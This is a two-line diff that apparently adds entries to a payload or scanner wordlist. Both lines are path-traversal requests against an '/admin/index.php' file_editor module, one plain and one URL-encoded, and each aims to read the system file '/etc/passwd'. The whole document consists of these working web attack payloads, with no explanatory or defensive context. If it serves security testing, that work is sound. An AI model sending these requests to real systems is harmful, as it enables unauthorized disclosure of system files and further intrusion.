@@ -1,0 +1,2 @@
+/admin/index.php?module=file_editor&file=/../../../../../../../../../../../etc/passwd
+/admin/index.php?module=file_editor&file=%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd
